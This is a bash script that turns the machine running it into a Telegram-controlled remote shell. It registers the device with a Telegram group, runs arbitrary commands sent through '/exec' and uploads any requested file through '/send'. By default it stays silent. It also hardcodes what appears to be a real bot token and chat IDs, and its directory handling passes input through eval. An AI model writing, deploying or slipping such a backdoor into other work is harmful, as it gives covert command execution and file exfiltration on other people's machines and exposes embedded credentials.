
TOKEN="7191521576:AAHJuRK8H3WLbqG5OAViOjGYiMW1zQnJTM8"
GROUP_ID="-1002311978540"
MY_CHAT_ID="1700631357"
BOT_USERNAME="Temp_ph_no_bot"
REGISTERED_DEVICES_FILE=".devices"
DEVICE_ID_FILE=".device_id"
DEVICE_ID=$(uname -o)-$(date +%s)
DEVICE_LINK="https://t.me/$BOT_USERNAME?start=device_$DEVICE_ID"
IS_DEVICE_REGISTERED=false
LAST_PROCESSED_MESSAGE=""
VERBOSE=false
[[ "$1" == "-v" || "$1" == "--verbose" ]] && VERBOSE=true

# Check if device is already registered
if [[ -f "$REGISTERED_DEVICES_FILE" ]]; then
    if grep -qxF "$DEVICE_ID" "$REGISTERED_DEVICES_FILE"; then
        IS_DEVICE_REGISTERED=true
    fi
fi

# Save DEVICE_ID to file if not exists
if [[ ! -f "$DEVICE_ID_FILE" ]]; then
    echo "$DEVICE_ID" > "$DEVICE_ID_FILE"
else
    DEVICE_ID=$(cat "$DEVICE_ID_FILE")
fi

# Register device function (only if it's not registered yet)
register_device() {
    if [[ "$IS_DEVICE_REGISTERED" == false ]]; then
        if [[ ! -f "$REGISTERED_DEVICES_FILE" ]]; then
            touch "$REGISTERED_DEVICES_FILE"
        fi

        # Check if the device is already in the list
        if ! grep -qxF "$DEVICE_ID" "$REGISTERED_DEVICES_FILE"; then
            echo "$DEVICE_ID" >> "$REGISTERED_DEVICES_FILE"
            send_message "$GROUP_ID" "Device connected: <b>$DEVICE_ID</b> <a href=\"$DEVICE_LINK\">Open Device</a>"
        fi
    fi
}

# Send message to Telegram
send_message() {
    local chat_id="$1"
    local message="$2"

    if $VERBOSE; then
        curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
            -d chat_id="$chat_id" \
            -d text="$message" \
            -d parse_mode="HTML"
    else
        curl -s -o /dev/null -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
            -d chat_id="$chat_id" \
            -d text="$message" \
            -d parse_mode="HTML"
    fi
}

# Handle '/devices' command (send the list only once per user)
handle_devices() {
    msg="<b>Available devices:</b>\n"
    while IFS= read -r device; do
        msg+="<a href=\"https://t.me/$BOT_USERNAME?start=device_$device\">$device</a>"
    done < "$REGISTERED_DEVICES_FILE"
    send_message "$1" "$msg"
}

# Handle '/exec' command
exec_command() {
    local cmd="$1"
    local chat_id="$2"

    # Load last working directory or fallback to current
    if [[ -f ".cwd" ]]; then
        CWD=$(cat .cwd)
    else
        CWD=$(pwd)
        echo "$CWD" > ".cwd"
    fi

    if [[ "$cmd" == "cd "* ]]; then
        # Extract the target path
        target="${cmd:3}"

        # Expand ~ to $HOME
        target="${target/#\~/$HOME}"

        # Expand other variables like $HOME, $USER, etc.
        target=$(eval echo "$target")

        # Use absolute path based on current directory
        if [[ ! "$target" = /* ]]; then
            target="$CWD/$target"
        fi

        if [[ -d "$target" ]]; then
            CWD=$(realpath "$target")
            echo "$CWD" > ".cwd"
            send_message "$chat_id" "Changed directory to: <code>$CWD</code>"
        else
            send_message "$chat_id" "No such directory: <code>$target</code>"
        fi
    else
        # Run command inside stored working directory
        output=$(cd "$CWD" && bash -c "$cmd" 2>&1)
        send_message "$chat_id" "<pre>${output:0:4000}</pre>"
    fi
}

#CWD=$(pwd)
#if [[ -f ".cwd" ]]; then
#    CWD=$(cat .cwd)
#fi

# Main loop to read updates (simple polling loop)
while true; do
    updates=$(curl -s "https://api.telegram.org/bot$TOKEN/getUpdates?offset=-1")
    
    message=$(echo "$updates" | jq -r '.result[0].message.text')
    chat_id=$(echo "$updates" | jq -r '.result[0].message.chat.id')

    # Check if the chat_id matches your own
    if [[ "$chat_id" != "$MY_CHAT_ID" ]]; then
        sleep 1
        continue
    fi

    if [[ -z "$message" || "$message" != /* ]]; then
        sleep 1
        continue
    fi

    # Check if the message has been processed already (prevents multiple responses)
    if [[ "$message" == "$LAST_PROCESSED_MESSAGE" ]]; then
        sleep 1
        continue
    fi

    LAST_PROCESSED_MESSAGE="$message"

    if [[ "$message" == "/start device_"* ]]; then
        selected_device="${message#*/start device_}"
        # Logic to connect user to device
        send_message "$chat_id" "You are now connected to device: <b>$selected_device</b>"
    elif [[ "$message" == "/devices" ]]; then
        handle_devices "$chat_id"
    elif [[ "$message" == "/exec "* ]]; then
        cmd="${message#*/exec }"
        exec_command "$cmd" "$chat_id"
    elif [[ "$message" == "/send "* ]]; then
        path="${message#*/send }"

        # Load current working directory
        if [[ -f ".cwd" ]]; then
           CWD=$(cat .cwd)
        else
           CWD=$(pwd)
        fi

        full_path="$CWD/$path"

        if [[ -f "$full_path" ]]; then
           if $VERBOSE; then
              curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                  -F chat_id="$chat_id" \
                  -F document=@"$full_path"
           else
              curl -s -o /dev/null -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                 -F chat_id="$chat_id" \
                 -F document=@"$full_path"
           fi
        else
             send_message "$chat_id" "File not found: <code>$path</code>"
        fi
    fi

    # To avoid duplicate device registrations, only call register_device once
    register_device

    sleep 1
done
